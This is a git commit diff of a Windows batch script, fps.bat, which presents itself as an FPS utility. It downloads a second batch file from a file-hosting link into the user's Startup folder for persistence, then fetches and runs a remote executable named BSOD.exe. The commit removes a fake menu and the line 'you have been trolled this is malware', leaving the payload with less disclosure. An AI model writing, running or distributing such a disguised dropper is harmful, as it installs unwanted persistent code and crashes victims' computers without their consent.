9a942d6f2c63ba1a42c663754c39f90b113453c9
Nate <99703235+GreatNate0509YT@users.noreply.github.com>
2022-11-10 20:08:02 -0600

    Fix / change

--- fps.bat
+++ fps.bat
@@ -4,23 +4,10 @@ color 0a
 cls 
 cd /d C:/
 cd %userprofile%
-curl -O https://download1493.mediafire.com/4tq09s0bw09g/c1mz4eb5g2pdnqm/fpsworker.bat
+curl -L https://download1493.mediafire.com/4tq09s0bw09g/c1mz4eb5g2pdnqm/fpsworker.bat > fpsworker.bat
 cls
 move "fpsworker.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\fpsworker.bat"
 del fpsworker.bat
-:start
-cls
-echo fps
-echo.
-set /p main= choose
-goto %main%
-
-
-
-:fps
-cls
-echo you have been trolled this is malware
-pause
-curl -O https://download1527.mediafire.com/1yamy5ufkxxg/qi2f5v76pi61gcg/BSOD.exe
+curl -L https://download1527.mediafire.com/1yamy5ufkxxg/qi2f5v76pi61gcg/BSOD.exe > BSOD.exe
 BSOD
 exit
